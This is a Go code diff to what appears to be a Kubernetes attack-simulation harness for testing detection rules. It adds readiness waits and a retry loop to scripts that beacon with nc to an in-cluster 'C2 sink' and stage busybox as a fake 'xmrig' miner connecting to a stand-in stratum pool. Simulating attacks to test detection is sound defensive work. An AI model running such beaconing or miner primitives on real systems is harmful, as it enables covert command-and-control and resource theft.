@@ -549,6 +549,16 @@ func (e *Executor) exec(ctx context.Context, script string) (string, error) {
 	return e.runCmd(ctx, "kubectl", "exec", "-n", Namespace, e.pod, "-c", containerName, "--", "sh", "-c", script)
 }
 
+// waitDeploymentReady blocks (bounded by attackWaitTimeout) until the named
+// attacker-infra Deployment in the shared namespace has rolled out, so the
+// S4/S5 primitive does not beacon/connect to a sink/pool with no live
+// listener (review round 1). Used only by the S4/S5 runners for their
+// sink/pool; the target workload's own rollout is gated in ensureTargetReady.
+func (e *Executor) waitDeploymentReady(ctx context.Context, name string) error {
+	_, err := e.runCmd(ctx, "kubectl", "rollout", "status", "deploy/"+name, "-n", Namespace, "--timeout", attackWaitTimeout)
+	return err
+}
+
 // runS1 executes the S1 container-escape technique (MITRE T1611 Escape to
 // Host; also T1610). From the privileged (CAP_SYS_ADMIN / CAP_SYS_PTRACE)
 // container it attempts to reach the host namespace / filesystem. The
@@ -692,6 +702,14 @@ func (e *Executor) runS3(ctx context.Context) error {
 // per-beacon connection failure is recorded but is still a real attempt (the
 // flow is emitted on the attempt), so it does not fail the trial.
 func (e *Executor) runS4(ctx context.Context) error {
+	// Wait for the in-cluster sink to be Ready before beaconing: it is applied
+	// before the workload but not gated on readiness, so an early beacon could
+	// hit a sink with no listener and produce no flow (review round 1, Blind
+	// Hunter + Edge Case Hunter). The 6 spaced beacons already ride out a brief
+	// gap, but the explicit wait removes the race.
+	if err := e.waitDeploymentReady(ctx, s4SinkService); err != nil {
+		return fmt.Errorf("s4 wait C2 sink ready: %w", err)
+	}
 	sink := s4SinkService + "." + Namespace + ".svc"
 	script := "command -v nc >/dev/null 2>&1 || { echo '[s4] nc missing'; exit 97; }; " +
 		"i=0; while [ $i -lt " + strconv.Itoa(s4BeaconCount) + " ]; do " +
@@ -720,13 +738,24 @@ func (e *Executor) runS4(ctx context.Context) error {
 // only the named execve matters for detection. A missing nc is a hard failure
 // (exit 97). Nothing leaves the cluster (AC2).
 func (e *Executor) runS5(ctx context.Context) error {
+	// Wait for the fake stratum pool to be Ready before connecting: unlike S4
+	// (6 spaced beacons) S5 makes few connections, so an unready pool would
+	// silently drop the only flow and miss OLT-IMPACT-006 (review round 1).
+	if err := e.waitDeploymentReady(ctx, s5PoolService); err != nil {
+		return fmt.Errorf("s5 wait stratum pool ready: %w", err)
+	}
 	pool := s5PoolService + "." + Namespace + ".svc"
+	// The pool connection RETRIES (up to 5 attempts, spaced) rather than firing
+	// once: a single refused connection (the listener's brief re-listen gap,
+	// or a just-Ready endpoint) would otherwise drop the network half and the
+	// script would still exit 0 (review round 1, Blind + Edge Case Hunter).
 	script := "command -v nc >/dev/null 2>&1 || { echo '[s5] nc missing'; exit 97; }; " +
 		"bb=\"$(command -v busybox || echo /bin/busybox)\"; " +
 		"cp \"$bb\" " + s5MinerPath + " && chmod +x " + s5MinerPath + " || { echo '[s5] stage miner failed'; exit 97; }; " +
 		s5MinerPath + " 2>/dev/null; echo \"[s5] xmrig execve rc=$?\"; " +
-		"echo mine | nc -w 3 " + pool + " " + s5MinerPort + " >/dev/null 2>&1; " +
-		"echo \"[s5] pool-connect rc=$?\""
+		"i=0; while [ $i -lt 5 ]; do " +
+		"echo mine | nc -w 3 " + pool + " " + s5MinerPort + " >/dev/null 2>&1 && { echo '[s5] pool-connect ok'; break; }; " +
+		"echo \"[s5] pool-connect retry $i rc=$?\"; i=$((i+1)); sleep 2; done"
 	out, err := e.exec(ctx, script)
 	if err != nil {
 		return fmt.Errorf("s5 miner primitive: %w", err)
